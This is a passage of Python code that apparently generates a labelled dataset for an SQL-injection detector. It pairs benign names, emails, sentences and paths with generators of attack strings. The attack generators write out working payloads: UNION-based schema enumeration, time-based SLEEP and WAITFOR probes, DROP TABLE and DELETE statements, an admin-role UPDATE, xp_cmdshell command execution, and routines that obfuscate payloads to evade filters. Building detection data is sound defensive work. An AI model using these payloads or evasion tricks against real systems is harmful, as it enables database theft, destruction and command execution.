            f"{prefix}' UNION SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema='{db}'{c}",
            f"{prefix}' UNION SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name='{table}'{c}",
            f"{prefix}' UNION SELECT table_type,table_name FROM information_schema.tables{c}",
            f"{prefix}' UNION SELECT ordinal_position,column_name FROM information_schema.columns WHERE table_name='{table}'{c}",
            # Oracle
            f"{prefix}' UNION SELECT table_name,NULL FROM all_tables{c}",
            f"{prefix}' UNION SELECT owner,table_name FROM all_tables{c}",
            f"{prefix}' UNION SELECT column_name,data_type FROM all_tab_columns WHERE table_name='{table.upper()}'{c}",
            # PostgreSQL
            f"{prefix}' UNION SELECT tablename,NULL FROM pg_tables{c}",
            f"{prefix}' UNION SELECT schemaname,tablename FROM pg_tables WHERE schemaname='public'{c}",
            f"{prefix}' UNION SELECT column_name,data_type FROM information_schema.columns WHERE table_name='{table}' AND table_schema='public'{c}",
            # MSSQL
            f"{prefix}' UNION SELECT name,NULL FROM sysobjects WHERE xtype='U'{c}",
            f"{prefix}' UNION SELECT name,NULL FROM syscolumns WHERE id=(SELECT id FROM sysobjects WHERE name='{table}'){c}",
            f"{prefix}' UNION SELECT DB_NAME(),NULL{c}",
            f"{prefix}' UNION SELECT name,NULL FROM master..sysdatabases{c}",
        ]

        s = random.choice(templates)
        if random.random() < 0.15:
            s = rand_case(s)
        if random.random() < 0.1:
            s = insert_comments(s)
        samples.add(s)

    return [(s, 'schema_enumeration') for s in list(samples)[:n]]


def gen_polyglot(n: int) -> List[Tuple[str, str]]:
    """Polyglot payloads that work across multiple DB engines (1,000)."""
    samples = set()

    while len(samples) < n:
        prefix = rand_prefix()
        table = rand_table()
        col = rand_column()
        c = rand_comment()
        val = rand_str(random.randint(2, 6))

        templates = [
            f"SLEEP(1)/*' or SLEEP(1) or '\" or SLEEP(1) or \"*/",
            f"1' AND '1'='1' UNION SELECT NULL{c} OR '1'='1",
            f"' OR 1=1-- -; DROP TABLE {table}--",
            f"admin'/**/OR/**/1=1/**/--",
            f"'-var x=1-'",
            f"{{{{constructor.constructor('return this')()}}}}",
            f"1;SELECT pg_sleep(5)--\n1';WAITFOR DELAY '0:0:5'--",
            f"' UNION SELECT 1,2,3-- -\"; UNION SELECT 1,2,3-- -",
            f"' OR ''='{c}\"; OR \"\"=\"{c}",
            f"-1' UNION SELECT 1,CONCAT(user(),0x3a,version()),3{c}",
            f"1' ORDER BY 1,2,3{c}",
            f"' AND 1=0 UNION ALL SELECT 1,2,{func}{c}" if (func := random.choice(DB_FUNCTIONS)) else "",
            f"0'XOR(if(now()=sysdate(),sleep(5),0))XOR'Z",
            f"if(now()=sysdate(),sleep(5),0)",
            f"' AND extractvalue(1,concat(0x7e,version()))",
            f"0xABCD' UNION SELECT NULL,NULL,NULL{c}",
            f"1' AND 1=CONVERT(int,(SELECT TOP 1 {col} FROM {table})){c}",
            f"' HAVING 1=1{c}",
            f"' AND 1=1 UNION ALL SELECT {col},NULL FROM {table}{c}",
            f"1; EXEC xp_cmdshell('whoami')-- -'; pg_sleep(5)--",
        ]

        s = random.choice(templates)
        if random.random() < 0.15:
            s = rand_case(s)
        samples.add(s)

    return [(s, 'polyglot') for s in list(samples)[:n]]


def gen_obfuscated(n: int) -> List[Tuple[str, str]]:
    """Obfuscated payloads across all injection types (10,000)."""
    samples = set()

    # Base payloads to obfuscate
    base_payloads = [
        "' OR '1'='1",
        "' UNION SELECT NULL--",
        "' AND SLEEP(5)--",
        "'; DROP TABLE users--",
        "' OR 1=1--",
        "admin'--",
        "' UNION SELECT username,password FROM users--",
        "' AND 1=1--",
        "' OR 'a'='a",
        "'; DELETE FROM users--",
        "' UNION SELECT version()--",
        "' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--",
        "' OR SLEEP(3)--",
        "'; UPDATE users SET role='admin'--",
        "' HAVING 1=1--",
        "' GROUP BY 1 HAVING 1=1--",
        "' AND (SELECT 1 FROM users)=1--",
        f"' UNION SELECT {rand_column()} FROM {rand_table()}--",
        "' WAITFOR DELAY '0:0:5'--",
        "'; EXEC xp_cmdshell('whoami')--",
    ]

    obfuscation_methods = [
        'url_encode', 'double_url', 'comment_insert', 'case_swap',
        'mixed', 'hex_encode', 'char_function', 'space_variations',
        'concat_break', 'version_comment',
    ]

    while len(samples) < n:
        base = random.choice(base_payloads)
        method = random.choice(obfuscation_methods)

        if method == 'url_encode':
            s = url_encode_partial(base, fraction=random.uniform(0.3, 0.7))
        elif method == 'double_url':
            s = double_url_encode(base, fraction=random.uniform(0.3, 0.6))
        elif method == 'comment_insert':
            s = insert_comments(base)
        elif method == 'case_swap':
            s = rand_case(base)
        elif method == 'mixed':
            s = rand_case(insert_comments(base))
            if random.random() < 0.3:
                s = url_encode_partial(s, fraction=0.2)
        elif method == 'hex_encode':
            s = base
            for lit in ["'1'", "'a'", "users", "admin"]:
                if lit in s and random.random() < 0.5:
                    hex_val = '0x' + lit.strip("'").encode().hex()
                    s = s.replace(lit, hex_val, 1)
        elif method == 'char_function':
            # Replace string literals with CHAR()
            s = base
            for lit in ["'1'", "'a'"]:
                if lit in s and random.random() < 0.5:
                    char_val = char_encode(lit.strip("'"))
                    s = s.replace(lit, char_val, 1)
        elif method == 'space_variations':
            # Replace spaces with alternative whitespace
            space_rep = random.choice(['/**/', '%09', '%0a', '%0d', '+', '%20%20'])
            s = base.replace(' ', space_rep)
        elif method == 'concat_break':
            # Break keywords with concat
            s = base
            for kw in ['UNION', 'SELECT', 'SLEEP', 'DROP']:
                if kw in s.upper():
                    mid = len(kw) // 2
                    broken = kw[:mid] + "/**/" + kw[mid:]
                    s = s.replace(kw, broken, 1)
                    s = s.replace(kw.lower(), broken.lower(), 1)
                    break
        elif method == 'version_comment':
            # MySQL version comments
            s = base
            for kw in ['UNION', 'SELECT', 'OR', 'AND', 'DROP']:
                if kw in s.upper():
                    ver = random.choice(['50000', '50001', '40100', '40000'])
                    repl = f'/*!{ver}{kw}*/'
                    s = s.replace(kw, repl, 1)
                    break

        # Additional random mutations
        if random.random() < 0.1:
            s = rand_case(s)
        if random.random() < 0.05:
            s = s + random.choice([' ', '%00', '\x00', '\n'])

        samples.add(s)

    return [(s, 'obfuscated') for s in list(samples)[:n]]


# ═══════════════════════════════════════════════════════════════════
# SAFE INPUT GENERATORS — 10 CATEGORIES
# ═══════════════════════════════════════════════════════════════════

FIRST_NAMES = [
    "James", "Mary", "John", "Patricia", "Robert", "Jennifer", "Michael",
    "Linda", "William", "Elizabeth", "David", "Barbara", "Richard", "Susan",
    "Joseph", "Jessica", "Thomas", "Sarah", "Charles", "Karen", "Christopher",
    "Lisa", "Daniel", "Nancy", "Matthew", "Betty", "Anthony", "Margaret",
    "Mark", "Sandra", "Donald", "Ashley", "Steven", "Dorothy", "Paul",
    "Kimberly", "Andrew", "Emily", "Joshua", "Donna", "Kenneth", "Michelle",
    "Kevin", "Carol", "Brian", "Amanda", "George", "Melissa", "Timothy",
    "Deborah", "Ronald", "Stephanie", "Edward", "Rebecca", "Jason", "Sharon",
    "Jeffrey", "Laura", "Ryan", "Cynthia", "Jacob", "Kathleen", "Gary",
    "Amy", "Nicholas", "Angela", "Eric", "Shirley", "Jonathan", "Anna",
    "Stephen", "Brenda", "Larry", "Pamela", "Justin", "Emma", "Scott",
    "Nicole", "Brandon", "Helen", "Benjamin", "Samantha", "Samuel", "Katherine",
    "Raymond", "Christine", "Gregory", "Debra", "Frank", "Rachel", "Alexander",
    "Carolyn", "Patrick", "Janet", "Jack", "Catherine",
]

LAST_NAMES = [
    "Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller",
    "Davis", "Rodriguez", "Martinez", "Hernandez", "Lopez", "Gonzalez",
    "Wilson", "Anderson", "Thomas", "Taylor", "Moore", "Jackson", "Martin",
    "Lee", "Perez", "Thompson", "White", "Harris", "Sanchez", "Clark",
    "Ramirez", "Lewis", "Robinson", "Walker", "Young", "Allen", "King",
    "Wright", "Scott", "Torres", "Nguyen", "Hill", "Flores", "Green",
    "Adams", "Nelson", "Baker", "Hall", "Rivera", "Campbell", "Mitchell",
    "Carter", "Roberts", "Gomez", "Phillips", "Evans", "Turner", "Diaz",
    "Parker", "Cruz", "Edwards", "Collins", "Reyes", "Stewart", "Morris",
    "Morales", "Murphy", "Cook", "Rogers", "Gutierrez", "Ortiz", "Morgan",
]

APOSTROPHE_NAMES = [
    "O'Brien", "O'Connor", "O'Neil", "O'Reilly", "O'Sullivan", "O'Malley",
    "O'Donnell", "O'Leary", "O'Hara", "O'Callaghan", "O'Grady", "O'Toole",
    "O'Keefe", "O'Dwyer", "O'Rourke", "O'Shea", "O'Byrne", "O'Donoghue",
    "D'Angelo", "D'Arcy", "D'Cruz", "D'Silva", "D'Costa", "D'Souza",
    "De'Andre", "De'Sean", "De'Marcus", "Da'Quon", "Sha'Quan",
    "McDonald's", "L'Oreal", "it's", "don't", "won't", "can't",
    "shouldn't", "they're", "we're", "you're", "he's", "she's",
    "children's", "women's", "men's", "rock 'n' roll", "ma'am",
    "o'clock", "ne'er-do-well", "fo'c'sle", "jack-o'-lantern",
]

DOMAINS_EMAIL = [
    "gmail.com", "yahoo.com", "hotmail.com", "outlook.com", "example.com",
    "company.org", "university.edu", "business.net", "mail.ru", "protonmail.com",
    "icloud.com", "aol.com", "zoho.com", "yandex.com", "fastmail.com",
    "tutanota.com", "gmx.com", "web.de", "mail.com", "inbox.com",
]

NATURAL_SENTENCES = [
    "Please select an option from the dropdown",
    "Select all that apply to your situation",
    "Drop me a line when you get a chance",
    "Please drop off the package at reception",
    "Update your profile information",
    "We will update you on the status",
    "Delete old files from the folder",
    "Please delete my account",
    "Join our union for better benefits",
    "The European Union announced new regulations",
    "Insert coin to play the game",
    "Insert your card into the reader",
    "The table is ready for dinner",
    "Check the table of contents",
    "Where is the nearest hospital",
    "Where do you want to go",
    "Let me order some food",
    "Order by name or by date",
    "Select the best option available",
    "We need to drop this topic",
    "The group will meet on Tuesday",
    "Having a great time on vacation",
    "Set your preferences in settings",
    "Create a new document",
    "Alter the recipe as needed",
    "Grant me permission to enter",
    "Execute the plan as discussed",
    "The values are within normal range",
    "I like the combination of colors",
    "We need to select candidates for the role",
    "The union representative will attend",
    "Please insert your feedback below",
    "You can delete cookies from your browser",
    "Drop by anytime you're free",
    "The database of knowledge is vast",
    "Null and void agreement",
    "There is no null hypothesis here",
    "Or maybe we should try something different",
    "And then we went to the store",
    "Not all heroes wear capes",
    "Is this the right approach",
    "Between you and me this is confidential",
    "Like a rolling stone down the hill",
    "From what I understand this is correct",
    "Having said that let us proceed with the plan",
    "In my humble opinion this works",
    "The schema looks good to me",
    "Let's truncate the text for display",
    "We need to alter our approach slightly",
    "Grant that the conditions are met",
    "Cast your vote in the election",
    "Count the number of participants",
    "The string is too long for the field",
    "Fetch the latest results from the server",
    "Execute the exercise routine daily",
    "The inner join between teams was successful",
    "We have a distinct advantage here",
    "The primary key to success is persistence",
    "Let's commit to this decision",
    "We need to rollback our changes",
    "The trigger for the alarm was false",
    "Index your documents for quick access",
    "This view is absolutely stunning",
    "The cursor blinked on the screen",
    "Check the constraints of the project",
    "The cascade effect was remarkable",
    "Natural language processing is amazing",
    "Give me a char broiled steak please",
    "The varchar model performed well",
    "Integer values only in this field",
    "Boolean logic is fundamental",
    "Float the idea past the team",
    "The decimal point is missing",
    "Timestamp of the event is recorded",
    "The interval between checks is 5 minutes",
    "Serial number for this product",
    "Array of options available",
    "The sequence is important here",
]

PATH_TEMPLATES_EXTENDED = [
    "/api/v1/users/{id}",
    "/api/v2/products/{id}",
    "/dashboard/settings",
    "/auth/login",
    "/auth/register",
    "/api/search?q={query}",
    "https://example.com/page/{id}",
    "https://cdn.example.com/images/{name}.jpg",
    "/uploads/{name}.pdf",
    "/files/{uuid}",
    "C:\\Users\\{name}\\Documents",
    "/home/{name}/projects",
    "/api/v3/reports/{id}/download",
    "/webhook/callback?token={token}",
    "https://app.example.com/dashboard#section-{id}",
    "/api/graphql?query={query}",
    "/static/js/main.{hash}.js",
    "/health-check",
    "/robots.txt",
    "/sitemap.xml",
    "/.well-known/openid-configuration",
    "/api/v1/orders?status=pending&page={id}",
]


def gen_safe_names(n: int) -> List[Tuple[str, str]]:
    """Realistic person names including apostrophes (8,000)."""
    samples = []
    for _ in range(n):
        kind = random.choice([
            'full', 'full', 'first', 'last', 'apostrophe', 'apostrophe',
            'username', 'hyphenated', 'middle', 'titled',
        ])
        if kind == 'full':
            s = f"{random.choice(FIRST_NAMES)} {random.choice(LAST_NAMES)}"
        elif kind == 'first':
            s = random.choice(FIRST_NAMES)
        elif kind == 'last':
            s = random.choice(LAST_NAMES)
        elif kind == 'apostrophe':
            s = random.choice(APOSTROPHE_NAMES)
        elif kind == 'username':
            fn = random.choice(FIRST_NAMES).lower()
            ln = random.choice(LAST_NAMES).lower()
            s = random.choice([
                f"{fn}_{ln}", f"{fn}.{ln}", f"{fn}{rand_int(1, 99)}",
                f"{fn[0]}{ln}", f"{fn}{ln[:3]}", f"{fn}-{ln}",
                f"{fn}_{rand_int(100, 999)}", f"x_{fn}_{ln}",
            ])
        elif kind == 'hyphenated':
            s = f"{random.choice(LAST_NAMES)}-{random.choice(LAST_NAMES)}"
        elif kind == 'middle':
            s = f"{random.choice(FIRST_NAMES)} {random.choice('ABCDEFGHIJKLMNOPQRSTUVWXYZ')}. {random.choice(LAST_NAMES)}"
        else:
            title = random.choice(['Dr.', 'Mr.', 'Mrs.', 'Ms.', 'Prof.'])
            s = f"{title} {random.choice(FIRST_NAMES)} {random.choice(LAST_NAMES)}"
        samples.append(s)
    return [(s, 'safe_names') for s in samples]


def gen_safe_emails(n: int) -> List[Tuple[str, str]]:
    """Realistic email addresses (5,000)."""
    samples = []
    for _ in range(n):
        fn = random.choice(FIRST_NAMES).lower()
        ln = random.choice(LAST_NAMES).lower()
        domain = random.choice(DOMAINS_EMAIL)
        fmt = random.choice([
            f"{fn}.{ln}@{domain}",
            f"{fn}{ln}@{domain}",
            f"{fn}_{ln}@{domain}",
            f"{fn[0]}{ln}@{domain}",
            f"{fn}{rand_int(1, 999)}@{domain}",
            f"{fn}.{ln}{rand_int(1, 99)}@{domain}",
            f"{fn[0]}.{ln}@{domain}",
            f"{ln}.{fn}@{domain}",
        ])
        samples.append(fmt)
    return [(s, 'safe_emails') for s in samples]


def gen_safe_ids(n: int) -> List[Tuple[str, str]]:
    """IDs, UUIDs, dates, IPs, phone numbers (5,000)."""
    samples = []
    for _ in range(n):
        kind = random.choice(['int', 'uuid', 'date', 'ip', 'phone', 'hex',
                              'datetime', 'version', 'mac', 'isbn'])
        if kind == 'int':
            s = str(rand_int(1, 9999999))
        elif kind == 'uuid':
            s = str(uuid.uuid4())
        elif kind == 'date':
            y = random.randint(2020, 2026)
            m = random.randint(1, 12)
            d = random.randint(1, 28)
            s = random.choice([
                f"{y}-{m:02d}-{d:02d}",
                f"{m:02d}/{d:02d}/{y}",
                f"{d:02d}.{m:02d}.{y}",
            ])
        elif kind == 'ip':
            s = f"{rand_int(1,255)}.{rand_int(0,255)}.{rand_int(0,255)}.{rand_int(1,255)}"
        elif kind == 'phone':
            fmt = random.choice([
                f"+1-{rand_int(200,999)}-{rand_int(100,999)}-{rand_int(1000,9999)}",
                f"+7 ({rand_int(900,999)}) {rand_int(100,999)}-{rand_int(10,99)}-{rand_int(10,99)}",
                f"+44 {rand_int(1000,9999)} {rand_int(100000,999999)}",
                f"({rand_int(200,999)}) {rand_int(100,999)}-{rand_int(1000,9999)}",
            ])
            s = fmt
        elif kind == 'hex':
            s = uuid.uuid4().hex[:random.randint(8, 32)]
        elif kind == 'datetime':
            y = random.randint(2020, 2026)
            s = f"{y}-{random.randint(1,12):02d}-{random.randint(1,28):02d}T{random.randint(0,23):02d}:{random.randint(0,59):02d}:{random.randint(0,59):02d}Z"
        elif kind == 'version':
            s = f"{random.randint(0,20)}.{random.randint(0,99)}.{random.randint(0,999)}"
        elif kind == 'mac':
            s = ':'.join(f'{random.randint(0,255):02x}' for _ in range(6))
        elif kind == 'isbn':
            s = f"978-{rand_int(0,9)}-{rand_int(1000,9999)}-{rand_int(1000,9999)}-{rand_int(0,9)}"
        samples.append(s)
    return [(s, 'safe_ids') for s in samples]


def gen_safe_sentences(n: int) -> List[Tuple[str, str]]:
    """Natural language with SQL keywords (8,000)."""
    samples = []
    # Additional dynamic sentence parts for uniqueness
    subjects = ['John', 'Maria', 'the team', 'our department', 'the manager',
                'Alice', 'Bob', 'the client', 'we', 'they', 'I', 'my boss',
                'the CEO', 'HR', 'engineering', 'sales', 'marketing', 'support']
    actions = ['will review', 'needs to check', 'should update', 'wants to select',
               'plans to drop', 'decided to alter', 'agreed to delete', 'chose to insert',
               'must create', 'can execute', 'started to fetch', 'finished to count',
               'promised to grant', 'tried to commit', 'managed to rollback']
    objects = ['the report', 'our records', 'the document', 'all items', 'the schedule',
               'the project plan', 'their homework', 'the database backup', 'meeting notes',
               'the budget proposal', 'quarterly results', 'the test scores', 'inventory data']
    times = ['today', 'tomorrow', 'next week', 'by Friday', 'after lunch', 'this morning',
             'before the deadline', 'on Monday', 'at 3pm', 'within 24 hours', 'ASAP']

    for _ in range(n):
        method = random.choice(['template', 'dynamic', 'combined'])
        if method == 'template':
            s = random.choice(NATURAL_SENTENCES)
        elif method == 'dynamic':
            s = f"{random.choice(subjects)} {random.choice(actions)} {random.choice(objects)} {random.choice(times)}"
        else:
            s = random.choice(NATURAL_SENTENCES)
            s = s + f" — {random.choice(subjects)} said {random.choice(times)}"

        # Uniqueness mutations
        if random.random() < 0.3:
            s = s.lower()
        if random.random() < 0.1:
            s = s.upper()
        if random.random() < 0.3:
            s = s + random.choice(['.', '!', '?', '...', '', ','])
        if random.random() < 0.15:
            s = random.choice(['Hey, ', 'BTW ', 'FYI: ', 'Note: ', 'Q: ', 'Re: ',
                               'Fwd: ', 'Urgent: ', 'TODO: ', 'DONE: ']) + s
        if random.random() < 0.2:
            s = s + f" #{rand_int(1, 99999)}"
        if random.random() < 0.15:
            s = s + f" (ref: {rand_alnum(6)})"
        samples.append(s)
    return [(s, 'safe_sentences') for s in samples]


def gen_safe_json(n: int) -> List[Tuple[str, str]]:
    """JSON strings, API tokens, key-value pairs (4,000)."""
    samples = []
    for _ in range(n):
        kind = random.choice(['json', 'token', 'base64', 'key_value', 'json_nested', 'jwt_like'])
        if kind == 'json':
            key = random.choice(['name', 'email', 'status', 'count', 'type', 'message', 'action', 'result'])
            val = random.choice(['active', 'pending', 'hello', '42', 'true', 'null', 'success', 'error'])
            s = f'{{"{key}": "{val}"}}'
        elif kind == 'token':
            prefix = random.choice(['sk-', 'pk-', 'Bearer ', 'token_', 'api_', 'ghp_', 'ghs_'])
            s = prefix + rand_alnum(random.randint(20, 48))
        elif kind == 'base64':
            s = rand_alnum(random.randint(16, 64)) + '=='
        elif kind == 'key_value':
            k = random.choice(['user_id', 'session', 'ref', 'lang', 'theme', 'mode', 'format'])
            v = random.choice(['en', 'dark', 'default', str(rand_int(1, 1000)), 'json', 'xml'])
            s = f"{k}={v}"
        elif kind == 'json_nested':
            s = f'{{"user": {{"name": "{random.choice(FIRST_NAMES)}", "age": {rand_int(18, 80)}}}}}'
        elif kind == 'jwt_like':
            # JWT-like token (3 parts separated by dots)
            s = f"{rand_alnum(36)}.{rand_alnum(random.randint(50, 100))}.{rand_alnum(43)}"
        samples.append(s)
    return [(s, 'safe_json') for s in samples]


def gen_safe_paths(n: int) -> List[Tuple[str, str]]:
    """URL paths and file paths (4,000)."""
    samples = []
    for _ in range(n):
        t = random.choice(PATH_TEMPLATES_EXTENDED)
        s = t.format(
            id=rand_int(1, 99999),
            query=rand_str(random.randint(3, 12)),
            name=rand_str(random.randint(4, 10)),
            uuid=str(uuid.uuid4()),
            token=rand_alnum(32),
            hash=rand_hex(8),
        )
        samples.append(s)
    return [(s, 'safe_paths') for s in samples]


def gen_safe_quotes(n: int) -> List[Tuple[str, str]]:
    """Strings with quotes that are NOT injections (4,000)."""
    samples = []

    templates = [
        "it's a beautiful day",
        "I'm going home",
        "they're coming tomorrow",
        'she said "hello"',
        "the file 'readme.txt' is missing",
        "use the 'help' command",
        "type 'yes' to confirm",
        "title: 'My First Post'",
        'name: "John Doe"',
        "error: 'file not found'",
        "value='checked'",
        "class='active'",
        "data-id='123'",
        "alt='logo image'",
        "placeholder='Enter your name'",
        "the dog's bone",
        "mother's day",
        "father's car",
        "today's special",
        "world's best",
        "boss's office",
        "1 + 1 = 2",
        "x = y + z",
        "a != b",
        "count >= 10",
        "price <= 50.00",
        "if (x > 0) { return true; }",
        "print('hello world')",
        "console.log('test')",
        "SELECT is a reserved word in SQL",
        "Let's meet at O'Brien's pub",
        "The film's title is 'It's Complicated'",
        "She's reading 'War and Peace'",
        "That's what he said: 'no comment'",
        "Children's books are on sale",
        "The company's Q2 earnings",
        "We're at McDonald's",
        "The surgeon's precision was remarkable",
        "Rock 'n' roll is here to stay",
        "There's always next year's competition",
    ]

    # Dynamic possessive/contraction generators
    possessive_nouns = ['friend', 'teacher', 'doctor', 'neighbor', 'brother',
                        'sister', 'parent', 'cousin', 'colleague', 'professor']
    possessive_things = ['car', 'house', 'phone', 'book', 'desk', 'laptop',
                         'bag', 'jacket', 'idea', 'opinion', 'schedule']

    for _ in range(n):
        method = random.choice(['template', 'possessive', 'contraction', 'quoted_value'])
        if method == 'template':
            s = random.choice(templates)
        elif method == 'possessive':
            noun = random.choice(possessive_nouns)
            thing = random.choice(possessive_things)
            name = random.choice(FIRST_NAMES)
            s = random.choice([
                f"{name}'s {thing} is {random.choice(['great', 'new', 'old', 'missing', 'broken'])}",
                f"my {noun}'s {thing}",
                f"the {noun}'s {thing} was {random.choice(['found', 'lost', 'replaced', 'fixed'])}",
            ])
        elif method == 'contraction':
            subject = random.choice(["I", "he", "she", "we", "they", "it", "you"])
            contraction = random.choice(["'m", "'s", "'re", "'ve", "'ll", "'d"])
            rest = random.choice(['going to the store', 'working today', 'done with it',
                                  'ready for the meeting', 'happy about it', 'leaving soon',
                                  f'working on ticket #{rand_int(100, 9999)}'])
            s = f"{subject}{contraction} {rest}"
        elif method == 'quoted_value':
            key = random.choice(['status', 'mode', 'type', 'format', 'action', 'result'])
            val = random.choice(['active', 'pending', 'done', 'error', rand_str(5)])
            s = random.choice([
                f"{key}='{val}'",
                f'{key}="{val}"',
                f"set {key} to '{val}'",
                f"the '{key}' field contains '{val}'",
            ])

        if random.random() < 0.3:
            s = rand_str(random.randint(2, 5)) + ' ' + s
        if random.random() < 0.2:
            s = s + ' ' + rand_str(random.randint(2, 5))
        if random.random() < 0.1:
            s = s.upper()
        if random.random() < 0.15:
            s = s + f" [{rand_int(1, 999)}]"
        samples.append(s)
    return [(s, 'safe_quotes') for s in samples]


def gen_safe_edge_cases(n: int) -> List[Tuple[str, str]]:
    """Edge case inputs: short strings, unicode, HTML, etc. (4,000)."""
    samples = []

    for _ in range(n):
        kind = random.choice([
            'single_char', 'short', 'numeric', 'unicode', 'html',
            'empty_like', 'special_chars', 'long_word', 'whitespace',
            'mixed_encoding', 'emoji_safe',
        ])

        if kind == 'single_char':
            s = random.choice(list(string.printable.strip()))
        elif kind == 'short':
            s = rand_str(random.randint(1, 4))
        elif kind == 'numeric':
            s = str(random.uniform(-1000, 1000))
        elif kind == 'unicode':
            names = [
                'Mueller', 'Bjork', 'Renee', 'Zoe', 'Noel', 'Jose', 'Cafe',
                'Cote', 'Deja vu', 'Naive', 'Resume', 'Role', 'Fiancee',
            ]
            s = random.choice(names)
        elif kind == 'html':
            tag = random.choice(['div', 'span', 'p', 'h1', 'a', 'img', 'br', 'table', 'form', 'input'])
            content = random.choice(['Hello', 'World', 'Click here', 'Submit', 'Loading...'])
            s = f"<{tag}>{content}</{tag}>"
        elif kind == 'empty_like':
            s = random.choice(['', ' ', '  ', '\t', '\n', 'N/A', 'null', 'none', 'undefined', '-', 'n/a', 'NULL', 'None'])
        elif kind == 'special_chars':
            s = ''.join(random.choices('!@#$%^&*()_+-=[]{}|;:,.<>?/', k=random.randint(3, 10)))
        elif kind == 'long_word':
            s = rand_str(random.randint(15, 50))
        elif kind == 'whitespace':
            s = '  ' + rand_str(random.randint(3, 8)) + '  '
        elif kind == 'mixed_encoding':
            s = f"{rand_str(3)}%20{rand_str(3)}+{rand_str(2)}"
        elif kind == 'emoji_safe':
            s = random.choice([
                ':)', ':(', ':D', '<3', ':-)', ':P', 'xD', '^_^',
                'hello :)', 'thanks! :D', 'ok :/',
            ])

        samples.append(s)
    return [(s, 'safe_edge') for s in samples]


def gen_safe_nosql_ldap_xpath(n: int) -> List[Tuple[str, str]]:
    """NoSQL/LDAP/XPath-like strings that look suspicious but are SAFE (4,000)."""
    samples = []

    collections = ['users', 'orders', 'products', 'sessions', 'logs', 'events',
                    'tasks', 'messages', 'documents', 'reports', 'metrics']
    fields_nosql = ['name', 'email', 'status', 'count', 'score', 'age', 'type',
                    'created_at', 'updated_at', 'category', 'price', 'rating']
    ops = ['$gt', '$lt', '$gte', '$lte', '$ne', '$eq', '$in', '$nin', '$exists']
    ldap_attrs = ['cn', 'sn', 'uid', 'mail', 'objectClass', 'memberOf',
                  'givenName', 'displayName', 'telephoneNumber', 'ou']
    html_tags = ['div', 'span', 'p', 'table', 'tr', 'td', 'ul', 'li', 'form',
                 'input', 'button', 'a', 'img', 'section', 'article', 'header']
    css_classes = ['content', 'active', 'hidden', 'main', 'sidebar', 'header',
                   'footer', 'container', 'wrapper', 'nav', 'card', 'modal']

    for _ in range(n):
        kind = random.choice(['nosql', 'nosql_dyn', 'ldap', 'ldap_dyn',
                               'xpath', 'xpath_dyn', 'regex', 'graphql', 'graphql_dyn'])
        if kind == 'nosql':
            field = random.choice(fields_nosql)
            op = random.choice(ops)
            val = random.choice([str(rand_int(0, 1000)), '"' + rand_str(5) + '"', 'null', 'true', 'false'])
            s = f'{{"{field}": {{"{op}": {val}}}}}'
        elif kind == 'nosql_dyn':
            col = random.choice(collections)
            field = random.choice(fields_nosql)
            s = random.choice([
                f'db.{col}.find({{"{field}": "{rand_str(5)}"}}).limit({rand_int(1, 100)})',
                f'db.{col}.aggregate([{{"$match": {{"{field}": "{rand_str(4)}"}}}}])',
                f'db.{col}.updateMany({{}}, {{"$set": {{"{field}": "{rand_str(3)}"}}}})',
                f'db.{col}.count({{"{field}": {{"{random.choice(ops)}": {rand_int(0, 100)}}}}})',
            ])
        elif kind == 'ldap':
            attr = random.choice(ldap_attrs)
            name = random.choice(FIRST_NAMES) + ' ' + random.choice(LAST_NAMES)
            s = f'({attr}={name})'
        elif kind == 'ldap_dyn':
            a1 = random.choice(ldap_attrs)
            a2 = random.choice(ldap_attrs)
            v1 = random.choice(FIRST_NAMES)
            v2 = random.choice(LAST_NAMES)
            s = random.choice([
                f'(&({a1}={v1})({a2}={v2}))',
                f'(|({a1}={v1})({a1}={v2}))',
                f'(&(objectClass=person)({a1}={v1}*))',
            ])
        elif kind == 'xpath':
            tag = random.choice(html_tags)
            cls = random.choice(css_classes)
            s = random.choice([
                f'//{tag}[@class="{cls}"]',
                f'//{tag}[@id="{rand_str(6)}"]',
                f'//{tag}[{rand_int(1, 10)}]/{random.choice(html_tags)}',
            ])
        elif kind == 'xpath_dyn':
            tag = random.choice(html_tags)
            attr = random.choice(['class', 'id', 'name', 'type', 'value', 'href'])
            s = f'//*[@{attr}="{rand_str(random.randint(3, 10))}"]/{tag}[{rand_int(1, 5)}]'
        elif kind == 'regex':
            patterns = [
                f'^[a-zA-Z0-9]{{{rand_int(3, 20)}}}$',
                f'\\d{{{rand_int(1, 4)}}}-\\d{{{rand_int(1, 4)}}}-\\d{{{rand_int(1, 6)}}}',
                f'^{rand_str(3)}.*{rand_str(2)}$',
                f'[{rand_str(2).upper()}]\\d{{{rand_int(3, 8)}}}',
            ]
            s = random.choice(patterns)
        elif kind == 'graphql':
            entity = random.choice(['user', 'product', 'order', 'post', 'comment'])
            field1 = random.choice(['id', 'name', 'title', 'status', 'email'])
            field2 = random.choice(['createdAt', 'updatedAt', 'price', 'count'])
            s = f'{{ {entity}(id: {rand_int(1, 9999)}) {{ {field1} {field2} }} }}'
        elif kind == 'graphql_dyn':
            entity = random.choice(['user', 'product', 'order', 'event'])
            s = f'mutation {{ update{entity.title()}(id: {rand_int(1, 999)}, name: "{random.choice(FIRST_NAMES)}") {{ id name }} }}'

        if random.random() < 0.15:
            s = rand_str(random.randint(2, 5)) + ' ' + s
        if random.random() < 0.1:
            s = f"// {s}"
        samples.append(s)
    return [(s, 'safe_nosql_ldap') for s in samples]


def gen_safe_code_snippets(n: int) -> List[Tuple[str, str]]:
    """Code snippets that contain SQL-like syntax but are safe (4,000)."""
    samples = []

    py_tables = ['users', 'orders', 'products', 'logs', 'events', 'tasks', 'sessions']
    py_cols = ['id', 'name', 'email', 'status', 'created_at', 'count', 'score', 'type']
    py_vars = ['result', 'data', 'output', 'rows', 'records', 'items', 'response']
    js_endpoints = ['/api/users', '/api/products', '/api/orders', '/api/search',
                    '/api/auth', '/api/reports', '/api/events', '/api/tasks']

    for _ in range(n):
        kind = random.choice(['python_dyn', 'js_dyn', 'sql_comment_dyn', 'config_dyn',
                               'shell_dyn', 'python_orm', 'variable_names'])
        if kind == 'python_dyn':
            t = random.choice(py_tables)
            c = random.choice(py_cols)
            v = random.choice(py_vars)
            s = random.choice([
                f"{v} = cursor.execute('SELECT {c} FROM {t} WHERE id = %s', ({rand_int(1, 999)},))",
                f"df = pd.read_sql('SELECT {c},{random.choice(py_cols)} FROM {t} LIMIT {rand_int(10, 1000)}', conn)",
